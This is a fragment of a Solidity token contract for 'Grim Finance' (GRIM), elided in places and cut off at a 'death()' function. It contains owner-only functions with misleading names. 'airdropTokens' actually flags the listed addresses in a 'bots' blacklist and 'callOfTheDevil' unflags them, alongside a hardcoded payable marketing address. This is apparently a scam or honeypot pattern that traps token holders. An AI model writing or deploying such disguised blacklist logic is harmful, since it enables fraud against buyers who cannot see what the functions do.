...
contract GRIM is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Grim Finance";
    string public _symbol= "GRIM";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x731930f8d0A14b667E04325c0D78D9B83c1d3b06);
    ...
    function airdropTokens(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = true;
        }
    }

    function callOfTheDevil(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = false;
        }
    }

    function death() onlyOwner public {
